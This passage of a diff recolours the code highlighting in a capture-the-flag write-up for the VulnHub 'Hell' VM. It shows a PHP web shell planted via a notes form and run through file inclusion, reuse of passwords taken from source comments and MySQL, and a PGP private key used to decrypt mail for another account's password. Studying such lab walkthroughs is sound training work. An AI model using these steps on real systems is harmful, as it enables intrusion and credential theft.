 &lt;/TR&gt;
 &lt;TR&gt;
    &lt;TD&gt;&lt;H4&gt;Server Status&lt;/H4&gt;&lt;/TD&gt;
@@ -545,9 +514,9 @@ root@kali:~# curl http://192.168.56.102/super_secret_login_path_muhahaha/panel.p
 &lt;/CENTRE&gt;
 Congratulations of beating Hell.
 
-I hope you enjoyed it and there weren<span style="color:#960050;background-color:#1e0010">&#39;</span>t to many trolls in here <span style="color:#66d9ef">for</span> you.
+I hope you enjoyed it and there weren&#39;t to many trolls in here <span style="color:#ff79c6">for</span> you.
 
-Hit me up on irc.freenode.net in <span style="color:#75715e">#vulnhub with your thoughts (Peleus) or follow me on twitter @0x42424242</span>
+Hit me up on irc.freenode.net in <span style="color:#6272a4">#vulnhub with your thoughts (Peleus) or follow me on twitter @0x42424242</span>
 
 Flag: a95fc0742092c50579afae5965a9787c54f1c641663def1697f394350d03e5a53420635c54fffc47476980343ab99951018fa6f71f030b9986c8ecbfc3a3d5de
 
@@ -558,48 +527,48 @@ root@kali:~#
 From here on onwards, the goal was no longer to read <code>/root/flag.txt</code>. No, we now have to root this VM :)</p>
 <h2 id="gaining-shell">gaining shell</h2>
 <p>With the focus slightly shifting, and our ability to read files off the file system, the next natural step was to attempt to get command execution on the VM. Remembering the <code>notes.php</code> file, I decided to try include <code>/tmp/note.txt</code>. This worked just fine and echoed my testing attempts from earlier. So with this information, I simply went back to <code>notes.php</code>, entered: <code>&lt;?php print_r(shell_exec($_GET['c'])); ?&gt;</code>, and submitted the form. Next I edited the cookiejar to include <code>/tmp/notes.txt</code>, and proceeded to test my command execution:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# curl http://192.168.56.102/super_secret_login_path_muhahaha/panel.php?c<span style="color:#f92672">=</span>id -c cookies -b cookies
-<span style="color:#f92672">[</span>snip<span style="color:#f92672">]</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# curl http://192.168.56.102/super_secret_login_path_muhahaha/panel.php?c<span style="color:#ff79c6">=</span>id -c cookies -b cookies
+<span style="color:#ff79c6">[</span>snip<span style="color:#ff79c6">]</span>
 &lt;/CENTRE&gt;
-uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
+<span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>33<span style="color:#ff79c6">(</span>www-data<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>33<span style="color:#ff79c6">(</span>www-data<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>33<span style="color:#ff79c6">(</span>www-data<span style="color:#ff79c6">)</span>
 &lt;/HTML&gt;
 root@kali:~#
 </code></pre></div><p>Yay :) With this confirmed working, I modified the command exec request slightly so that commands with potentially strange characters are correctly encoded etc:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl http://192.168.56.102/super_secret_login_path_muhahaha/panel.php?c<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo -n “ls -lah” | python -c <span style="color:#e6db74">&#34;import urllib, sys; print urllib.quote(&#39;&#39;.join(sys.stdin));&#34;</span><span style="color:#66d9ef">)</span> -c cookies -b cookies
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl http://192.168.56.102/super_secret_login_path_muhahaha/panel.php?c<span style="color:#ff79c6">=</span><span style="color:#ff79c6">$(</span><span style="color:#8be9fd;font-style:italic">echo</span> -n “ls -lah” | python -c <span style="color:#f1fa8c">&#34;import urllib, sys; print urllib.quote(&#39;&#39;.join(sys.stdin));&#34;</span><span style="color:#ff79c6">)</span> -c cookies -b cookies
 </code></pre></div><h2 id="becoming-jack">becoming jack</h2>
 <p>With command execution, it was easy to start enumerating as much as possible about the VM. At least as much as the <code>www-data</code> user has access to, which is generally quite a lot.</p>
 <p>I looked at the source files for the website out of curiosity about the filtering etc that was going on. I stumbled upon some MySQL credentials in <code>login.php</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">// mysql_connect(&#34;127.0.0.1&#34;, &#34;Jack&#34;, &#34;zgcR6mU6pX&#34;) or die (&#34;Server Error&#34;); I&#39;ll change this back once development is done. Got sick of typing my password.
-</span><span style="color:#75715e"></span><span style="color:#a6e22e">mysql_connect</span>(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>, <span style="color:#e6db74">&#34;www-data&#34;</span>, <span style="color:#e6db74">&#34;website&#34;</span>) <span style="color:#66d9ef">or</span> <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Server Error&#34;</span>);
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#6272a4">// mysql_connect(&#34;127.0.0.1&#34;, &#34;Jack&#34;, &#34;zgcR6mU6pX&#34;) or die (&#34;Server Error&#34;); I&#39;ll change this back once development is done. Got sick of typing my password.
+</span><span style="color:#6272a4"></span>mysql_connect(<span style="color:#f1fa8c">&#34;127.0.0.1&#34;</span>, <span style="color:#f1fa8c">&#34;www-data&#34;</span>, <span style="color:#f1fa8c">&#34;website&#34;</span>) <span style="color:#ff79c6">or</span> <span style="color:#ff79c6">die</span>(<span style="color:#f1fa8c">&#34;Server Error&#34;</span>);
 </code></pre></div><p>The comment was quite helpful along with all the mentions of Jack on the website, along with the <code>/etc/passwd</code> revealing a <code>jack</code> user, I tried these credentials on a SSH session:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# ssh jack@192.168.56.102
-jack@192.168.56.102<span style="color:#960050;background-color:#1e0010">&#39;</span>s password:
-Linux hell 3.2.0-4-486 <span style="color:#75715e">#1 Debian 3.2.57-3+deb7u2 i686</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# ssh jack@192.168.56.102
+jack@192.168.56.102&#39;s password:
+Linux hell 3.2.0-4-486 <span style="color:#6272a4">#1 Debian 3.2.57-3+deb7u2 i686</span>
 
 The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
+the exact distribution terms <span style="color:#ff79c6">for</span> each program are described in the
 individual files in /usr/share/doc/*/copyright.
 
 Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
 No mail.
-Last login: Sun Jul <span style="color:#ae81ff">20</span> 04:29:06 <span style="color:#ae81ff">2014</span> from 192.168.56.1
+Last login: Sun Jul <span style="color:#bd93f9">20</span> 04:29:06 <span style="color:#bd93f9">2014</span> from 192.168.56.1
 $ id
-uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>jack<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>jack<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>jack<span style="color:#f92672">)</span>
+<span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>1001<span style="color:#ff79c6">(</span>jack<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>1001<span style="color:#ff79c6">(</span>jack<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>1001<span style="color:#ff79c6">(</span>jack<span style="color:#ff79c6">)</span>
 $
 </code></pre></div><p>Well that was easy&hellip; With this shell, I also checked out the MySQL database to see if there is any interesting information:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ mysql -uwww-data -pwebsite
-Welcome to the MySQL monitor.  Commands end with ; or <span style="color:#ae81ff">\g</span>.
-Your MySQL connection id is <span style="color:#ae81ff">10320</span>
-Server version: 5.5.37-0+wheezy1 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ mysql -uwww-data -pwebsite
+Welcome to the MySQL monitor.  Commands end with ; or <span style="color:#f1fa8c">\g</span>.
+Your MySQL connection id is <span style="color:#bd93f9">10320</span>
+Server version: 5.5.37-0+wheezy1 <span style="color:#ff79c6">(</span>Debian<span style="color:#ff79c6">)</span>
 
-Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> 2000, 2014, Oracle and/or its affiliates. All rights reserved.
+Copyright <span style="color:#ff79c6">(</span>c<span style="color:#ff79c6">)</span> 2000, 2014, Oracle and/or its affiliates. All rights reserved.
 
 Oracle is a registered trademark of Oracle Corporation and/or its
 affiliates. Other names may be trademarks of their respective
 owners.
 
-Type <span style="color:#e6db74">&#39;help;&#39;</span> or <span style="color:#e6db74">&#39;\h&#39;</span> <span style="color:#66d9ef">for</span> help. Type <span style="color:#e6db74">&#39;\c&#39;</span> to clear the current input statement.
+Type <span style="color:#f1fa8c">&#39;help;&#39;</span> or <span style="color:#f1fa8c">&#39;\h&#39;</span> <span style="color:#ff79c6">for</span> help. Type <span style="color:#f1fa8c">&#39;\c&#39;</span> to clear the current input statement.
 
 mysql&gt; show databases;
 +--------------------+
@@ -608,10 +577,10 @@ mysql&gt; show databases;
 | information_schema |
 | website            |
 +--------------------+
-<span style="color:#ae81ff">2</span> rows in set <span style="color:#f92672">(</span>0.00 sec<span style="color:#f92672">)</span>
+<span style="color:#bd93f9">2</span> rows in <span style="color:#8be9fd;font-style:italic">set</span> <span style="color:#ff79c6">(</span>0.00 sec<span style="color:#ff79c6">)</span>
 
 mysql&gt; use website;
-Reading table information <span style="color:#66d9ef">for</span> completion of table and column names
+Reading table information <span style="color:#ff79c6">for</span> completion of table and column names
 You can turn off this feature to get a quicker startup with -A
 
 Database changed
@@ -621,30 +590,30 @@ mysql&gt; show tables;
 +-------------------+
 | users             |
 +-------------------+
-<span style="color:#ae81ff">1</span> row in set <span style="color:#f92672">(</span>0.00 sec<span style="color:#f92672">)</span>
+<span style="color:#bd93f9">1</span> row in <span style="color:#8be9fd;font-style:italic">set</span> <span style="color:#ff79c6">(</span>0.00 sec<span style="color:#ff79c6">)</span>
 
-mysql&gt; <span style="color:#66d9ef">select</span> * from users;
+mysql&gt; <span style="color:#ff79c6">select</span> * from users;
 +----------+-----------+
 | username | password  |
 +----------+-----------+
 | Jack     | g0tmi1k69 |
 +----------+-----------+
-<span style="color:#ae81ff">1</span> row in set <span style="color:#f92672">(</span>0.00 sec<span style="color:#f92672">)</span>
+<span style="color:#bd93f9">1</span> row in <span style="color:#8be9fd;font-style:italic">set</span> <span style="color:#ff79c6">(</span>0.00 sec<span style="color:#ff79c6">)</span>
 
 mysql&gt;
 </code></pre></div><p>Alrighty. I made a note about the credentials we have associated with &lsquo;Jack&rsquo; so far. I also tested these credentials on the website, just to get a feel of what the site was actually supposed to do :P</p>
 <h2 id="becoming-milk_4_life">becoming milk_4_life</h2>
 <p>Jack had a <code>.pgp</code> folder with a private key stored in hes home directory.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ pwd
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ <span style="color:#8be9fd;font-style:italic">pwd</span>
 /home/jack/.pgp
 
 $ ls -lah
 total 20K
-drwx------ <span style="color:#ae81ff">2</span> jack jack 4.0K Jun <span style="color:#ae81ff">18</span> 12:35 .
-drwx------ <span style="color:#ae81ff">4</span> jack jack 4.0K Jun <span style="color:#ae81ff">22</span> 18:28 ..
--rwx------ <span style="color:#ae81ff">1</span> jack jack   <span style="color:#ae81ff">39</span> Jun <span style="color:#ae81ff">18</span> 12:35 note
--rwx------ <span style="color:#ae81ff">1</span> jack jack 1.8K Jun <span style="color:#ae81ff">18</span> 12:20 pgp.priv
--rwx------ <span style="color:#ae81ff">1</span> jack jack  <span style="color:#ae81ff">890</span> Jun <span style="color:#ae81ff">18</span> 12:24 pgp.pub
+drwx------ <span style="color:#bd93f9">2</span> jack jack 4.0K Jun <span style="color:#bd93f9">18</span> 12:35 .
+drwx------ <span style="color:#bd93f9">4</span> jack jack 4.0K Jun <span style="color:#bd93f9">22</span> 18:28 ..
+-rwx------ <span style="color:#bd93f9">1</span> jack jack   <span style="color:#bd93f9">39</span> Jun <span style="color:#bd93f9">18</span> 12:35 note
+-rwx------ <span style="color:#bd93f9">1</span> jack jack 1.8K Jun <span style="color:#bd93f9">18</span> 12:20 pgp.priv
+-rwx------ <span style="color:#bd93f9">1</span> jack jack  <span style="color:#bd93f9">890</span> Jun <span style="color:#bd93f9">18</span> 12:24 pgp.pub
 
 $ cat pgp.priv
 -----BEGIN PGP PRIVATE KEY BLOCK-----
@@ -676,21 +645,21 @@ l18rYZec9cDUrflowd/A4QVrJNCV/5kCyPeQ03mzGHnlTTvb/qBMymmpVBeP3JoK
 vZkGYzFBmrt7q19b3VcvexLTwtLtch8NUOt6719UFRvxE+EXu4JbItr7dSqfYDbh
 zHsfGaeU1hCQJg/n83IRxTBsc7h1jIOxraovzbErqpZ6YeYhCK5oo38dJVpz9Daa
 quU6lGTizKWX3HS29HQl+PJvzoHyj3T6Aw71BZF4lZNrJmzxHqhVYuRWptioyTWo
-tqg<span style="color:#f92672">=</span>
-<span style="color:#f92672">=</span>SCkw
+<span style="color:#8be9fd;font-style:italic">tqg</span><span style="color:#ff79c6">=</span>
+<span style="color:#ff79c6">=</span>SCkw
 -----END PGP PRIVATE KEY BLOCK-----
 $
 </code></pre></div><p>There was also a note in the directory:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat note
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat note
 The usual password as with everything.
 </code></pre></div><p>With all this information now known to us, and the fact that I know PGP is pretty popular to encrypt files and sign mail, I figured we had to get this key loaded and decrypt something using it. Further enumeration revealed that <code>/var/mail</code> was world readable:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ pwd
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ <span style="color:#8be9fd;font-style:italic">pwd</span>
 /var/mail/jack/received
 $ ls -lah
 total 12K
-drwxr-sr-x <span style="color:#ae81ff">2</span> root mail 4.0K Jun <span style="color:#ae81ff">18</span> 12:26 .
-drwxr-sr-x <span style="color:#ae81ff">3</span> jack jack 4.0K Jul  <span style="color:#ae81ff">5</span> 19:56 ..
--rw-r--r-- <span style="color:#ae81ff">1</span> root mail  <span style="color:#ae81ff">709</span> Jun <span style="color:#ae81ff">18</span> 12:26 message.eml
+drwxr-sr-x <span style="color:#bd93f9">2</span> root mail 4.0K Jun <span style="color:#bd93f9">18</span> 12:26 .
+drwxr-sr-x <span style="color:#bd93f9">3</span> jack jack 4.0K Jul  <span style="color:#bd93f9">5</span> 19:56 ..
+-rw-r--r-- <span style="color:#bd93f9">1</span> root mail  <span style="color:#bd93f9">709</span> Jun <span style="color:#bd93f9">18</span> 12:26 message.eml
 $ cat message.eml
 -----BEGIN PGP MESSAGE-----
 Version: BCPG C# v1.6.1.0
@@ -704,241 +673,241 @@ MWXhiYbZSRyHq7gaYRKS6kzG6uLlsyq4YnQzhz8M+sm4dePDBvs7U6yAPJf4oAAH
 9o01Fp3IJ1isvVMH5Fr8MwQjOAuo6Yh6TwbOrI/MVpphJQja8gDKVYr2tlqNS5me
 V8xJ7ZUxsh67w/5s5s1JgEDQt+f4wckBc8Dx5k9SbS9iRUbZ0oLJ3IM8cUj3CDoo
 svsh0u4ZWj4SrLsEdErcNX6gGihRl/xs3qdVOpXtesSvxEQcWHLqtMY94tb29faD
-+oQPjG3V4cSY5r566esUAlCn7ooYyx6Dug<span style="color:#f92672">==</span>
-<span style="color:#f92672">=</span>svWU
++oQPjG3V4cSY5r566esUAlCn7ooYyx6Dug<span style="color:#ff79c6">==</span>
+<span style="color:#ff79c6">=</span>svWU
 -----END PGP MESSAGE-----
 </code></pre></div><p>I loaded the private GPG key into jacks keyring with:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ gpg --import .pgp/pgp.priv
-gpg: keyring <span style="color:#e6db74">`</span>/home/jack/.gnupg/secring.gpg<span style="color:#960050;background-color:#1e0010">&#39;</span> created
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ gpg --import .pgp/pgp.priv
+gpg: keyring <span style="color:#f1fa8c">`</span>/home/jack/.gnupg/secring.gpg&#39; created
 gpg: key 3F18AB0A: secret key imported
-gpg: key 3F18AB0A: public key <span style="color:#e6db74">&#34;jack@cowlovers.com&#34;</span> imported
-gpg: Total number processed: <span style="color:#ae81ff">1</span>
-gpg:               imported: <span style="color:#ae81ff">1</span>  <span style="color:#f92672">(</span>RSA: 1<span style="color:#f92672">)</span>
-gpg:       secret keys read: <span style="color:#ae81ff">1</span>
-gpg:   secret keys imported: <span style="color:#ae81ff">1</span>
+gpg: key 3F18AB0A: public key <span style="color:#f1fa8c">&#34;jack@cowlovers.com&#34;</span> imported
+gpg: Total number processed: <span style="color:#bd93f9">1</span>
+gpg:               imported: <span style="color:#bd93f9">1</span>  <span style="color:#ff79c6">(</span>RSA: 1<span style="color:#ff79c6">)</span>
+gpg:       secret keys read: <span style="color:#bd93f9">1</span>
+gpg:   secret keys imported: <span style="color:#bd93f9">1</span>
 </code></pre></div><p>Ofc this doesn’t mean I can actually use it yet, however there was a note about the password, so I could possibly just try all the ones I have found so far for jack. Decrypting the encrypted message we found for jack was as simple as:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ gpg /var/mail/jack/received/message.eml
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ gpg /var/mail/jack/received/message.eml
 
-You need a passphrase to unlock the secret key <span style="color:#66d9ef">for</span>
-user: <span style="color:#e6db74">&#34;jack@cowlovers.com&#34;</span>
+You need a passphrase to unlock the secret key <span style="color:#ff79c6">for</span>
+user: <span style="color:#f1fa8c">&#34;jack@cowlovers.com&#34;</span>
 
-<span style="color:#75715e"># used the password g0tmi1k69 found in the MySQL database</span>
+<span style="color:#6272a4"># used the password g0tmi1k69 found in the MySQL database</span>
 
 2048-bit RSA key, ID 3F18AB0A, created 2014-06-18
 
 gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
 gpg: encrypted with 2048-bit RSA key, ID 3F18AB0A, created 2014-06-18
-      <span style="color:#e6db74">&#34;jack@cowlovers.com&#34;</span>
+      <span style="color:#f1fa8c">&#34;jack@cowlovers.com&#34;</span>
 gpg: /var/mail/jack/received/message.eml: unknown suffix
-Enter new filename <span style="color:#f92672">[</span>text.txt<span style="color:#f92672">]</span>:
+Enter new filename <span style="color:#ff79c6">[</span>text.txt<span style="color:#ff79c6">]</span>:
 gpg: WARNING: message was not integrity protected
 
 $ cat text.txt
-Ok Jack. I<span style="color:#e6db74">&#39;ve created the account &#39;</span>milk_4_life<span style="color:#e6db74">&#39; as per your request. Please stop emailing me about this now or I&#39;</span>m going to talk to HR like we discussed.
+Ok Jack. I<span style="color:#f1fa8c">&#39;ve created the account &#39;</span>milk_4_life<span style="color:#f1fa8c">&#39; as per your request. Please stop emailing me about this now or I&#39;</span>m going to talk to HR like we discussed.
 
-The password is <span style="color:#e6db74">&#39;4J0WWvL5nS&#39;</span>
+The password is <span style="color:#f1fa8c">&#39;4J0WWvL5nS&#39;</span>
 </code></pre></div><p>So, lets ssh in as <code>milk_4_life</code>&hellip;</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# ssh milk_4_life@192.168.56.102
-milk_4_life@192.168.56.102<span style="color:#960050;background-color:#1e0010">&#39;</span>s password:
-Linux hell 3.2.0-4-486 <span style="color:#75715e">#1 Debian 3.2.57-3+deb7u2 i686</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# ssh milk_4_life@192.168.56.102
+milk_4_life@192.168.56.102&#39;s password:
+Linux hell 3.2.0-4-486 <span style="color:#6272a4">#1 Debian 3.2.57-3+deb7u2 i686</span>
 
 The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
+the exact distribution terms <span style="color:#ff79c6">for</span> each program are described in the
 individual files in /usr/share/doc/*/copyright.
 
 Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
 $ id
-uid<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>milk_4_life<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>milk_4_life<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1002<span style="color:#f92672">(</span>milk_4_life<span style="color:#f92672">)</span>
+<span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>1002<span style="color:#ff79c6">(</span>milk_4_life<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>1002<span style="color:#ff79c6">(</span>milk_4_life<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>1002<span style="color:#ff79c6">(</span>milk_4_life<span style="color:#ff79c6">)</span>
 </code></pre></div><p>Easy :D</p>
 <h2 id="becoming-george">becoming george</h2>
 <p>The user <code>milk_4_life</code> has a <code>game</code> in hes home folder.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ls -lah game
----s--x--x <span style="color:#ae81ff">1</span> george george 5.7K Jun <span style="color:#ae81ff">19</span> 18:24 game
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ls -lah game
+---s--x--x <span style="color:#bd93f9">1</span> george george 5.7K Jun <span style="color:#bd93f9">19</span> 18:24 game
 
 $ ./game
-I<span style="color:#960050;background-color:#1e0010">&#39;</span>m listening
+I&#39;m listening
 </code></pre></div><p>Not a very interesting game thus far. I decided to quit and rerun the game, this time backgrounding it with <code>&amp;</code>. At this stage I wanted to run a netstat to see if it is <em>listening</em> on a port or something, but the netstat command was not available. I figured I could cause a error as the same port can not be opened twice. So, with <code>./game &amp;</code> already running, another instance of <code>./game</code> errored out, revealing the listening port:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ./game &amp;
-I<span style="color:#960050;background-color:#1e0010">&#39;</span>m listening
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ./game &amp;
+I&#39;m listening
 
 $ ./game
-Traceback <span style="color:#f92672">(</span>most recent call last<span style="color:#f92672">)</span>:
-  File <span style="color:#e6db74">&#34;/usr/bin/game.py&#34;</span>, line 58, in &lt;module&gt;
-    tcpSocket.bind<span style="color:#f92672">((</span><span style="color:#e6db74">&#34;0.0.0.0&#34;</span>, 1337<span style="color:#f92672">))</span>
-  File <span style="color:#e6db74">&#34;/usr/lib/python2.7/socket.py&#34;</span>, line 224, in meth
-    <span style="color:#66d9ef">return</span> getattr<span style="color:#f92672">(</span>self._sock,name<span style="color:#f92672">)(</span>*args<span style="color:#f92672">)</span>
-socket.error: <span style="color:#f92672">[</span>Errno 98<span style="color:#f92672">]</span> Address already in use
+Traceback <span style="color:#ff79c6">(</span>most recent call last<span style="color:#ff79c6">)</span>:
+  File <span style="color:#f1fa8c">&#34;/usr/bin/game.py&#34;</span>, line 58, in &lt;module&gt;
+    tcpSocket.bind<span style="color:#ff79c6">((</span><span style="color:#f1fa8c">&#34;0.0.0.0&#34;</span>, 1337<span style="color:#ff79c6">))</span>
+  File <span style="color:#f1fa8c">&#34;/usr/lib/python2.7/socket.py&#34;</span>, line 224, in meth
+    <span style="color:#ff79c6">return</span> getattr<span style="color:#ff79c6">(</span>self._sock,name<span style="color:#ff79c6">)(</span>*args<span style="color:#ff79c6">)</span>
+socket.error: <span style="color:#ff79c6">[</span>Errno 98<span style="color:#ff79c6">]</span> Address already in use
 Lol nope
 $
 </code></pre></div><p>tcp/1337 it is. Lets telnet to this:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">milk_4_life@hell:~$ telnet 127.0.0.1 <span style="color:#ae81ff">1337</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">milk_4_life@hell:~$ telnet 127.0.0.1 <span style="color:#bd93f9">1337</span>
 Trying 127.0.0.1...
 Connected to 127.0.0.1.
-Escape character is <span style="color:#e6db74">&#39;^]&#39;</span>.
-Type <span style="color:#e6db74">&#39;START&#39;</span> to begin
+Escape character is <span style="color:#f1fa8c">&#39;^]&#39;</span>.
+Type <span style="color:#f1fa8c">&#39;START&#39;</span> to begin
 
 START
 Starting...
 
-You have <span style="color:#ae81ff">30</span> seconds to get as many points as you can, beat the high score! <span style="color:#f92672">(</span>High Score: 133723<span style="color:#f92672">)</span>
+You have <span style="color:#bd93f9">30</span> seconds to get as many points as you can, beat the high score! <span style="color:#ff79c6">(</span>High Score: 133723<span style="color:#ff79c6">)</span>
 
-Quick what<span style="color:#e6db74">&#39;s... 397 x 358? 1
-</span><span style="color:#e6db74">Quick what&#39;</span>s... <span style="color:#ae81ff">498</span> x 111? <span style="color:#ae81ff">2</span>
-Quick what<span style="color:#960050;background-color:#1e0010">&#39;</span>s... <span style="color:#ae81ff">740</span> x 772?
-Final Score: <span style="color:#ae81ff">0</span>
+Quick what<span style="color:#f1fa8c">&#39;s... 397 x 358? 1
+</span><span style="color:#f1fa8c">Quick what&#39;</span>s... <span style="color:#bd93f9">498</span> x 111? <span style="color:#bd93f9">2</span>
+Quick what&#39;s... <span style="color:#bd93f9">740</span> x 772?
+Final Score: <span style="color:#bd93f9">0</span>
 
 Connection closed by foreign host.
 milk_4_life@hell:~$
 </code></pre></div><p>Typing anything other than <code>START</code> would simply cause the script to die. Typing a non integer as a answer causes a loop, and that is about it.
 Sooo, time to win this game and see what would happen. I decided to attempt this with a python script. The general idea would be to read the socket output, calculate the answer and send that back. This resulted in a script as follows (yeah I know its not perfect but gets the job done):</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python</span>
-<span style="color:#f92672">import</span> socket<span style="color:#f92672">,</span> sys
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/python</span>
+<span style="color:#ff79c6">import</span> socket<span style="color:#ff79c6">,</span> sys
 
-<span style="color:#75715e"># start a socket</span>
-sock <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket()
-<span style="color:#75715e"># connect locally</span>
-sock<span style="color:#f92672">.</span>connect((<span style="color:#e6db74">&#39;127.0.0.1&#39;</span>, <span style="color:#ae81ff">1337</span>))
-ret <span style="color:#f92672">=</span> sock<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)   <span style="color:#75715e"># read 1024 bytes</span>
